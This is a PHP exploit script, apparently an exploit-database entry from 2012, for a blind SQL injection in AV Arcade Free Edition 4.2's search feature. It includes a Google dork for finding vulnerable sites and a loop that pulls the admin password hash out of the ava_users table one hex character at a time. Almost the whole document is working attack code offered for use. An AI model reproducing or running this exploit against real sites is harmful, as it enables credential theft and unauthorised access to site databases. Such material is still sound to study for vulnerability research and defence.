<?
# Exploit Title: AV Arcade Free Edition (search.php) Blind SQL Injection
# Google Dork: Powered by AV Arcade Free Edition
# Date: 05/09/2012
# Exploit Author: RAB3OUN
# Vendor Homepage: http://www.avscripts.net/avarcade/
# Software Link: http://www.avscripts.net/downloads/avarcade-v42.zip
# Version: AV Arcade Free Edition 4.2
# Note : Magic Quotes=OFF
#Greets: Ahwak2000

ini_set("max_execution_time",0);
$url="http://site.com/avarcade/";
$valid_search="saw";
$h="0123456789abcdef";
for ($g = 1; $g <= 32; $g++) {
for ($i = 0; $i < 16; $i++) {
$a=file_get_contents("$url/index.php?q=".$valid_search."\"+and+mid((select+password+from+ava_users+limit+0,1),".$g.",1)='".$h[$i]."'+and+\"4&submit.x=0&submit.y=0&task=search");
if(!ereg('Sorry, no results',$a)){
echo $h[$i];
}
}
}
?>
